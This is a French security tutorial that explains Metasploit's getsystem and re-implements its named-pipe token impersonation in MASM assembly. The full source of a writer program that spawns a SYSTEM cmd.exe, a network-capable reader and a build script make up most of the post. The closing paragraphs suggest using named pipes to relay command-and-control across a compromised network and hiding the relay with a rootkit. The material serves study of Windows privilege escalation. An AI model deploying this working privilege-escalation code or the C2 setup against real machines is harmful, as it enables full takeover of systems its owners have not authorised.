
Après une élévation de privilège d'un utilisateur local vers un administrateur local, on peut avoir envie de prendre le contrôle total de la machine en devenant un utilisateur SYSTEM.

La différence principale entre un utilisateur __Administrators__ et un utilisateur __SYSTEM__ est que le __SYSTEM__ n'a pas de compte et n'a donc pas de mot de passe. Les accès au système de fichiers sont les mêmes pour les Administrators et pour le SYSTEM. Les services tournent en tant que SYSTEM, mais il faut savoir qu'il est tout à fait possible pour un Admin d'obtenir un shell en tant que SYSTEM sans avoir besoin d'exploiter une vulnérabilité. Par exemple, l'outil __psexec__ de Sysinternal permet de faire cela:

```
psexec -s -i cmd.exe
```

Cette commande exécutée sur un shell admin ouvrira un shell SYSTEM.

Pour ceux qui utilisent __metasploit__, il y a une commande bien connue qui permet de devenir SYSTEM: __getsystem__. L'idée de cet article n'est pas de présenter la commande __getsystem__ mais de comprendre son fonctionnement puis de le reproduire en assembleur ^^.

Pour devenir SYSTEM, le module metasploit __impersonifie__ l'utilisateur SYSTEM par le biais de __named pipes__. C'est une méthode fournie par Windows afin qu'un processus puisse prendre le context de sécurité d'un utilisateur. Cela est utilisé pour avoir davantage de privilèges, mais aussi pour limiter les privilèges d'un processus. Les 2 cas sont envisageables. 

Le contexte de sécurité se transmet via un token de sécurité. Il faut alors récupérer ce token (__OpenThreadToken()__), le dupliquer (__DuplicateTokenEx()__), puis l'utiliser (__CreateProcessWithTokenW()__) pour ouvrir un shell en tant que SYSTEM. Afin de pouvoir effectuer ces actions, nous avons besoin d'un processus tournant en tant que SYSTEM: un service. Pour ceux qui souhaitent en savoir davantage sur l'impersonification, allez jeter un coup sur la msdn (https://docs.microsoft.com/en-us/windows/win32/com/impersonation).

Dans cet article, je n'utiliserais pas de service car je le réserve pour un prochain article. Nous allons nous contenter de faire tourner un programme en tant que SYSTEM en utilisant __psexec__. Le but sera de récupérer le contexte de sécurité de ce process puis de l'utiliser pour __spawner__ un shell SYSTEM.

Pour ce faire Metasploit créer un service (ce que nous ne ferons pas ici pour le moment) qui communique avec le shell admin via des __named pipes__. 

Les __named pipes__ sont à considérer en comparaison des __anonymous pipes__. Les pipes sont des objets permettant la communication inter-procesus. Ils fonctionnent dans les deux sens, c'est-à-dire du processus 1 vers le processus 2, mais aussi du processus 2 vers le processus 1. Ils se comportent comme des fichiers mais ne sont pas déposés sur le disque. Le fait qu'ils se comportent comme des fichiers est juste une manière de dire qu'on peut lire et écrire dans un pipe à l'aide des fonctions __ReadFile()__ et __WriteFile()__. 

Les __anonymous pipes__ servent en général à rediriger les IO (entrées/sortie/erreur) d'un processus fils vers un autre processus père. En revanche les __named pipes__ sont des canaux de communications globaux et peuvent de ce fait être lu/écrit par n'importe quel processus (si les ACL l'autorisent). De plus, ils sont accessibles à travers le réseau (comunication RPC par exemple ^^), ce qui en fait un outils de choix pour les attaquants. Les __anonymous pipes__ peuvent permettre de communiquer avec un service. C'est un fait intéressant, bien qu'annexe à cet article, car les services tournent dans la session 0, tandis que la session 1 est réservé à l'utilisateur. Cette ségrégation a lieu depuis Windows Vista, et permet de cloisoner les services tournant en tant que SYSTEM aux utilisateurs locaux.

Pour lister les __anonymous pipes__ ouvert sur votre sessions, l'outil __pipelist__ de sysinternal est utile. Il est possible d'utiliser la commande powershell suivante également:


```
((Get-ChildItem \\.pipe\).)name[-1..-5]
```

Pour écrire dans un __named pipe__, il suffit de:

```
echo toto >> \\.\Pipe\nom_de_mon_pipe
```

On peut aussi l'interoger sur le réseau:

```
echo toto >> \\192.168.0.28\Pipe\nom_de_mon_pipe
```

Avant d'écrire dans un __named pipe__, il faut d'abord le créer en utilisant la fonction __CreateNamedPipe()__. Le code ci-dessous qui fait partie du programme  __np-writer.exe__ (named pipe writer) permet d'écrire dans un __named pipe__:

```
    ; 3: PIPE_ACCESS_DUPLEX ;  4: PIPE_TYPE_MESSAGE
    invoke CreateNamedPipeA, addr namedPipeName ,3, 4, 1, 1024, 1024, 0, 0 

    mov ebx, eax
    invoke ConnectNamedPipe, ebx, 0
    cmp eax, 0
    jnz ConnectNamedPipeOk
    invoke CloseHandle, ebx
    jmp exit

ConnectNamedPipeOk:

    invoke WriteFile, ebx, addr testWrite, 14, addr BytesWritten, 0 
    cmp eax, 0
    jnz WriteFileOk
    invoke CloseHandle, ebx
    jmp exit
```

J'ai utilisé le compilateur et linker de Microsoft, plutôt que celui de masm32 (https://www.masm32.com/), que j'utilisais auparavant. La raison est que ce compilateur est vieux et que de nouvelles fonctions dont j'aurais besoin ne sont pas présentes alors qu'elles le sont dans la version founies par VisualStudio.

Le programme __np-writer.exe__ est exécuté en tant qu'__Administrator__.

En debuggant le code, le debugger s'arretera automatiquement sur la fonction __WriteFile()__, car aucun fichier n'a été crée pour le moment. Il n'y a qu'un pipe d'ouvert. Je vais créer le fichier dans un autre programme qui me servira à lire dans le pipe et que j'appelerais __np-reader.exe__ (named pipe reader).

```
    ; NMPWAIT_WAIT_FOREVER: 0FFFFh
    invoke WaitNamedPipeA, addr namedPipeName, 0FFFFh

    ; GENERIC_READ or GENERIC_WRITE: 0C0000000h
    ; OPEN_EXISTING: 3
    invoke CreateFileA, addr namedPipeName, 0C0000000h, 0, 0, 3, 0, 0
    mov ebx, eax

    invoke ReadFile, ebx, addr buffer, 256, addr BytesRead, 0
```

Le programme __np-reader.exe__ est exécuté en tant que __SYSTEM__ (grâce à psexec), et c'est son contexte de sécurité que le programme __np-writer.exe__ va impersonifier.

Ce bout de code attend indéfiniment le named pipe, puis créer un fichier, ce qui redonne la main au code __np-writer__. Le code s'arretera à la fonction __ReadFile()__ car il n'y a rien dans le pipe. On va donc écrire dans le pipe (np-writer.exe) comme vu dans la portion de code précédente.

Afin de pouvoir impersonifier un contexte de sécurité, il faut absolument qu'il y ait eu une écriture/lecture. Cela se comprend, sinon il n'y a aucune interaction entre les 2 processus. 

Pour impersonifier, j'utilise la fonction __ImpersonateNamedPipeClient()__ comme suit:

```
WriteFileOk:
    invoke ImpersonateNamedPipeClient, ebx
    ;invoke GetLastError
    cmp eax, 0
    jnz ImpersonateOk
    jmp exit
```

Si tout se passe bien, je récupère un handle sur le thread, puis je récupère le token de sécurité que je duplique et que j'utilise pour ouvrir un shell SYSTEM:


```
ImpersonateOk:

    invoke GetCurrentThread
    ; F01FF: TOKEN_ALL_ACCESS
    invoke OpenThreadToken, eax, 0F01FFh, 0, addr token
    cmp eax, 0
    jnz OpenThreadTokenOk
    jmp exit


OpenThreadTokenOk:
    
    ;http://pinvoke.net/default.aspx/Enums.SECURITY_IMPERSONATION_LEVEL
    ; F01FF: TOKEN_ALL_ACCESS
    ; TokenPrimary: 1
    invoke DuplicateTokenEx, token, 0F01FFh, 0, 3, 1, addr newtoken
    ;invoke GetLastError
    cmp eax, 0
    jnz DuplicateTokenOk
    jmp exit

DuplicateTokenOk:

    invoke CreateProcessWithTokenW, newtoken, 2, 0, addr cmd, 10h, 0, 0, addr startinfo, addr procinfo
;    invoke GetLastError

    invoke DisconnectNamedPipe, ebx
```

![image alt text](/images/get-system/named_pipes.png)


Le code complet du __np-writer.exe__ est présent ci-dessous:

```

.586
.model flat, stdcall


; kernel32.dll
GetLastError PROTO STDCALL
ExitProcess PROTO STDCALL 		dwExitCode:DWORD
CreateNamedPipeA PROTO STDCALL 	lpName:DWORD, 
				dwOpenMode:DWORD, 
				dwPipeMode:DWORD, 
				nMawInstances:DWORD, 
				nOutBufferSize:DWORD, 
				nInBufferSize:DWORD, 
				nDefaultTimeOut:DWORD, 
				lpSecurityAttributes:DWORD
ConnectNamedPipe PROTO STDCALL 	hNamedPipe:DWORD,
				lpOverlapped:DWORD
CloseHandle PROTO STDCALL 	hObject:DWORD
WriteFile PROTO STDCALL 	hFile:DWORD,
				lpBuffer:DWORD,
				nNumberOfBytesToWrite:DWORD,
				lpNumberOfBytesWritten:DWORD,
				lpOverlapped:DWORD
GetCurrentThread PROTO STDCALL
GetCurrentProcess PROTO STDCALL
DisconnectNamedPipe PROTO STDCALL hNamedPipe:DWORD


; advapi32.dll
ImpersonateNamedPipeClient PROTO STDCALL hNamedPipe:DWORD
OpenThreadToken PROTO STDCALL 	ThreadHandle:DWORD,
				DesiredAccess:DWORD,
				OpenAsSelf:DWORD,
				TokenHandle:DWORD		
OpenProcessToken PROTO STDCALL 	ProcessHandle:DWORD,
				DesiredAccess:DWORD,
				TokenHandle:DWORD	
DuplicateTokenEx PROTO STDCALL 	hExistingToken:DWORD,
				dwDesiredAccess:DWORD,
				lpTokenAttributes:DWORD,
				ImpersonationLevel:DWORD,
				TokenType:DWORD,
				phNewToken:DWORD	
CreateProcessAsUserA PROTO STDCALL 	hToken:DWORD,
					lpApplicationName:DWORD,
					lpCommandLine:DWORD,
					lpProcessAttributes:DWORD,
					lpThreadAttributes:DWORD,
					bInheritHandles:DWORD,
					dwCreationFlags:DWORD,
					lpEnvironment:DWORD,
					lpCurrentDirectory:DWORD,
					lpStartupInfo:DWORD,
					lpProcessInformation:DWORD
CreateProcessWithTokenW PROTO STDCALL 	hToken:DWORD,
					dwLogonFlags:DWORD,
					lpApplicationName:DWORD,
					lpCommandLine:DWORD,
					dwCreationFlags:DWORD,
					lpEnvironment:DWORD,
					lpCurrentDirectory:DWORD,
					lpStartupInfo:DWORD,
					lpProcessInformation:DWORD



; https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information
PROCESS_INFORMATION    struct 
hProcess    	DWORD    ?
hThread    	DWORD    ?
dwProcessId    	DWORD    ?
dwThreadId    	DWORD    ?
PROCESS_INFORMATION    ends

; https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa
STARTUPINFOA    struct 
cb    		DWORD    ?
lpReserved    	DWORD    ?
lpDesktop    	DWORD    ?
lpTitle    	DWORD    ?
dwX    		DWORD    ?
dwY    		DWORD    ?
dwXSize    	DWORD    ?
dwYSize    	DWORD    ?
dwXCountChars   DWORD    ?
dwYCountChars   DWORD    ?
dwFillAttribute DWORD    ?
dwFlags    	DWORD    ?
wShowWindow    	WORD    ?
cbReserved2   	WORD    ?
lpReserved2    	DWORD    ?
hStdInput    	DWORD    ?
hStdOutput    	DWORD    ?
hStdError    	DWORD    ?
STARTUPINFOA    ends


.data
    namedPipeName   db "\\.\Pipe\HACK", 0
    testWrite db "This is a hack", 0
    cmd dw "c","m","d",".","e","x","e", 0 ; UNICODE -> WORD
    ;cmd db "cmd.exe", 0 ; ANSI -> BYTE

.data?
    BytesWritten   DWORD ?
    token          DWORD ?
    newtoken       DWORD ?
    startinfo      STARTUPINFOA         <>
    procinfo       PROCESS_INFORMATION <>

.code

Start PROC

    ; 3: PIPE_ACCESS_DUPLEX ;  4: PIPE_TYPE_MESSAGE
    invoke CreateNamedPipeA, addr namedPipeName ,3, 4, 1, 1024, 1024, 0, 0 

    mov ebx, eax
    invoke ConnectNamedPipe, ebx, 0
    cmp eax, 0
    jnz ConnectNamedPipeOk
    invoke CloseHandle, ebx
    jmp exit

ConnectNamedPipeOk:

    invoke WriteFile, ebx, addr testWrite, 14, addr BytesWritten, 0 
    cmp eax, 0
    jnz WriteFileOk
    invoke CloseHandle, ebx
    jmp exit

WriteFileOk:
    invoke ImpersonateNamedPipeClient, ebx
    ;invoke GetLastError
    cmp eax, 0
    jnz ImpersonateOk
    jmp exit

ImpersonateOk:

    invoke GetCurrentThread
    ; F01FF: TOKEN_ALL_ACCESS
    invoke OpenThreadToken, eax, 0F01FFh, 0, addr token
    cmp eax, 0
    jnz OpenThreadTokenOk
    jmp exit


OpenThreadTokenOk:
    
    ;http://pinvoke.net/default.aspx/Enums.SECURITY_IMPERSONATION_LEVEL
    ; F01FF: TOKEN_ALL_ACCESS
    ; TokenPrimary: 1
    invoke DuplicateTokenEx, token, 0F01FFh, 0, 3, 1, addr newtoken
    ;invoke GetLastError
    cmp eax, 0
    jnz DuplicateTokenOk
    jmp exit

DuplicateTokenOk:

    invoke CreateProcessWithTokenW, newtoken, 2, 0, addr cmd, 10h, 0, 0, addr startinfo, addr procinfo
;    invoke GetLastError

    invoke DisconnectNamedPipe, ebx

exit:
	xor eax, eax
	push eax
	call ExitProcess
	

Start ENDP
END
```

Le code complet du __np-reader.asm__ est présenté ci-dessous:

```
.586
.model flat, stdcall

; kernel32.dll
GetLastError PROTO STDCALL
ExitProcess PROTO STDCALL       dwExitCode:DWORD
WaitNamedPipeA PROTO STDCALL    lpNamedPipeName:DWORD,
                                nTimeOut:DWORD
CreateFileA PROTO STDCALL       lpFileName:DWORD,
                                dwDesiredAccess:DWORD,
                                dwShareMode:DWORD,
                                lpSecurityAttributes:DWORD,
                                dwCreationDisposition:DWORD,
                                dwFlagsAndAttributes:DWORD,
                                hTemplateFile:DWORD
ReadFile PROTO STDCALL          hFile:DWORD,
                                lpBuffer:DWORD,
                                nNumberOfBytesToRead:DWORD,
                                lpNumberOfBytesRead:DWORD,
                                lpOverlapped:DWORD
CloseHandle PROTO STDCALL       hObject:DWORD

	
.data
    namedPipeName   db "\\192.168.0.28\Pipe\HACK", 0


.data?
    buffer      db 256 dup (?)
    BytesRead   DWORD ?
    

.code

Start PROC
    ; NMPWAIT_WAIT_FOREVER: 0FFFFh
    invoke WaitNamedPipeA, addr namedPipeName, 0FFFFh

    ; GENERIC_READ or GENERIC_WRITE: 0C0000000h
    ; OPEN_EXISTING: 3
    invoke CreateFileA, addr namedPipeName, 0C0000000h, 0, 0, 3, 0, 0
    mov ebx, eax

    invoke ReadFile, ebx, addr buffer, 256, addr BytesRead, 0

    cmp eax, 0
    jnz ReadFileOk
    invoke CloseHandle, ebx
    jmp exit

ReadFileOk:


exit:
    xor eax, eax
    push eax
    call ExitProcess

Start ENDP
END
```

Le code permettant de compiler et linker les programmes est présent ci-dessous:

```
@echo off

set prog=np_writer

if exist %prog%.exe del %prog%.exe

"C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.23.28105\bin\Hostx64\x86\ml.exe" %prog%.asm /link /subsystem:console /defaultlib:"C:\Program Files (x86)\Windows Kits\10\Lib\10.0.18362.0\um\x86\ntdll.lib" /defaultlib:"C:\Program Files (x86)\Windows Kits\10\Lib\10.0.18362.0\um\x86\kernel32.lib" /defaultlib:"C:\Program Files (x86)\Windows Kits\10\Lib\10.0.18362.0\um\x86\User32.lib" /defaultlib:"C:\Program Files (x86)\Windows Kits\10\Lib\10.0.18362.0\um\x86\AdvAPI32.Lib" /entry:Start

del %prog%.obj

pause
```

Pour en revenir à Metasploit, le module getsystem est à utiliser en tant qu'admin. Il créer un service que l'adminitrateur peut installer. Ce service tournera en tant que SYSTEM dans la session 0. Ainsi toute éventuelle GUI que le service pourrait vouloir ouvrir ne sera pas visible en session 1. Pour communiquer avec la session 1 et récupérer le contexte de sécurité, il y a aura communication par l'intermediaire de named pipes.

Ainsi que ce soit par l'intermédiaire de psexec ou du module getsystem de metasploit, il y a forcément altération du systeme de fichier (sauf si psexec est chargé en RAM).

L'avantage des named pipes devient vraiment efficaces quand on envisage de communiquer sur différentes machines à travers le réseaux, afin d'avoir un CnC (Command And Control) sur le réseau victime et un CnC à l'exterieur du réseau. Ainsi on limite les connections vers l'exterieurs à partir de toutes les machines compromisent sur le SI. Il n'y aura qu'une machine compromise qui communiquera avec l'exterieur, tandis que les autres machines compromises communiqueront avec le CnC interne. 

Il faut alors s'ateler à bien cacher le CnC interne en codant par exemple un rootkit qui __hook__ les fonctions principales de listing de processus, ...


